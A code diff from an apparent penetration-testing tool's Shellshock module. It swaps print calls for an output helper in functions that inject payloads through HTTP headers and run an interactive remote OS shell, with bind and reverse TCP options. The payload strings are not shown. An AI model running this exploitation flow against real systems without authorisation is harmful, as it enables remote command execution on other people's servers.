@@ -189,7 +189,7 @@ def execute_shell(url, cmd, cve, check_header, filename, os_shell_option):
   shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
   err_msg = "The " + os_shell_option.split("_")[0] + " "
   err_msg += os_shell_option.split("_")[1].upper() + " connection has failed."
-  print(settings.print_critical_msg(err_msg))
+  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
 
 """
 Configure the bind TCP shell
@@ -268,7 +268,7 @@ def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_r
   # The "os_shell" option
   elif os_shell_option == "os_shell": 
     warn_msg = "You are into the '" + os_shell_option + "' mode."
-    print(settings.print_warning_msg(warn_msg))
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
     return go_back, go_back_again
 
   # The "bind_tcp" option
@@ -312,7 +312,7 @@ def shellshock_handler(url, http_request_method, filename):
 
         # Check if defined "--verbose" option.
         if settings.VERBOSITY_LEVEL != 0:
-          print(settings.print_payload(payload))
+          settings.print_data_to_stdout(settings.print_payload(payload))
         header = {check_header : payload}
         request = _urllib.request.Request(url, None, header)
         if check_header == settings.COOKIE:
@@ -342,8 +342,8 @@ def shellshock_handler(url, http_request_method, filename):
 
         if settings.VERBOSITY_LEVEL == 0:
           info_msg = "Testing the " + technique + "." + "" + percent + ""
-          sys.stdout.write("\r" + settings.print_info_msg(info_msg))
-          sys.stdout.flush()
+          settings.print_data_to_stdout(settings.END_LINE.CR +settings.print_info_msg(info_msg))
+          
 
         if no_result == False:
           # Check injection state
@@ -367,9 +367,9 @@ def shellshock_handler(url, http_request_method, filename):
           # Print the findings to terminal.
           info_msg = settings.CHECKING_PARAMETER + " appears to be injectable via " + technique + "."
           if settings.VERBOSITY_LEVEL == 0:
-            print(settings.SINGLE_WHITESPACE)
-          print(settings.print_bold_info_msg(info_msg))
-          print(settings.print_sub_content(payload))
+            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+          settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+          settings.print_data_to_stdout(settings.print_sub_content(payload))
 
           # Enumeration options.
           if settings.ENUMERATION_DONE:
@@ -429,13 +429,13 @@ def shellshock_handler(url, http_request_method, filename):
               else:
                 gotshell = common.read_input(message, default="n", check_batch=True)
               if gotshell in settings.CHOICE_YES:
-                print(settings.OS_SHELL_TITLE)
+                settings.print_data_to_stdout(settings.OS_SHELL_TITLE)
                 if settings.READLINE_ERROR:
                   checks.no_readline_module()
                 while True:
                   if not settings.READLINE_ERROR:
                     checks.tab_autocompleter()
-                  sys.stdout.write(settings.OS_SHELL)
+                  settings.print_data_to_stdout(settings.END_LINE.CR +settings.OS_SHELL)
                   cmd = common.read_input(message="", default="os_shell", check_batch=True)
                   cmd = checks.escaped_cmd(cmd)
                   if cmd.lower() in settings.SHELL_OPTIONS:
@@ -454,19 +454,19 @@ def shellshock_handler(url, http_request_method, filename):
                     if shell != "":
                       # Update logs with executed cmds and execution results.
                       logs.executed_command(filename, cmd, shell)
-                      print(settings.command_execution_output(shell))
+                      settings.print_data_to_stdout(settings.command_execution_output(shell))
                     else:
                       debug_msg = "Executing the '" + cmd + "' command. "
                       if settings.VERBOSITY_LEVEL == 1:
-                        print(settings.print_debug_msg(debug_msg))
-                        print(settings.print_payload(payload))
+                        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+                        settings.print_data_to_stdout(settings.print_payload(payload))
                       elif settings.VERBOSITY_LEVEL >= 2:
-                        print(settings.print_debug_msg(debug_msg))
-                        sys.stdout.write(settings.print_payload(payload))
+                        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+                        settings.print_data_to_stdout(settings.print_payload(payload))
                       if settings.VERBOSITY_LEVEL >= 2:
-                        print(settings.SINGLE_WHITESPACE)
+                        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                       err_msg = common.invalid_cmd_output(cmd)
-                      print(settings.print_error_msg(err_msg))
+                      settings.print_data_to_stdout(settings.print_error_msg(err_msg))
               elif gotshell in settings.CHOICE_NO:
                 if checks.next_attack_vector(technique, go_back) == True:
                   break
@@ -486,14 +486,14 @@ def shellshock_handler(url, http_request_method, filename):
               break
           
           except (KeyboardInterrupt, SystemExit): 
-            print(settings.SINGLE_WHITESPACE)
+            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
             raise
 
           except EOFError:
             if settings.STDIN_PARSING:
-              print(settings.SINGLE_WHITESPACE)
+              settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
             err_msg = "Exiting, due to EOFError."
-            print(settings.print_error_msg(err_msg))
+            settings.print_data_to_stdout(settings.print_error_msg(err_msg))
             raise
 
           except TypeError:
@@ -501,9 +501,9 @@ def shellshock_handler(url, http_request_method, filename):
 
     if no_result == True:
       if settings.VERBOSITY_LEVEL == 0:
-        print(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
       err_msg = "All tested HTTP headers appear to be not injectable."
-      print(settings.print_critical_msg(err_msg))
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
       raise SystemExit()
     else:
       logs.logs_notification(filename)
@@ -513,8 +513,8 @@ def shellshock_handler(url, http_request_method, filename):
       response = False  
     elif settings.IGNORE_ERR_MSG == False:
       err = str(err_msg) + "."
-      print(settings.SINGLE_WHITESPACE)
-      print(settings.print_critical_msg(err))
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+      settings.print_data_to_stdout(settings.print_critical_msg(err))
       continue_tests = checks.continue_tests(err_msg)
       if continue_tests == True:
         settings.IGNORE_ERR_MSG = True
@@ -525,12 +525,12 @@ def shellshock_handler(url, http_request_method, filename):
     err_msg = str(err_msg.reason).split(settings.SINGLE_WHITESPACE)[2:]
     err_msg = ' '.join(err_msg)+ "."
     if settings.VERBOSITY_LEVEL != 0 and settings.LOAD_SESSION == False:
-      print(settings.SINGLE_WHITESPACE)
-    print(settings.print_critical_msg(err_msg))
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
     raise SystemExit()
 
   except _http_client.IncompleteRead as err_msg:
-    print(settings.print_critical_msg(err_msg + "."))
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg + "."))
     raise SystemExit()  
     
 """
@@ -548,11 +548,11 @@ def cmd_exec(url, cmd, cve, check_header, filename):
       payload = shellshock_exploitation(cve, cmd)
       debug_msg = "Executing the '" + cmd + "' command. "
       if settings.VERBOSITY_LEVEL != 0:
-        sys.stdout.write(settings.print_debug_msg(debug_msg))
+        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
 
       if settings.VERBOSITY_LEVEL != 0:
-        print(settings.SINGLE_WHITESPACE)
-        print(settings.print_payload(payload))
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.print_payload(payload))
 
       header = {check_header : payload}
       request = _urllib.request.Request(url, None, header)
@@ -573,8 +573,8 @@ def cmd_exec(url, cmd, cve, check_header, filename):
       return shell, payload
 
     except _urllib.error.URLError as err_msg:
-      print(settings.SINGLE_WHITESPACE)
-      print(settings.print_critical_msg(err_msg))
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
       raise SystemExit()
 
   shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
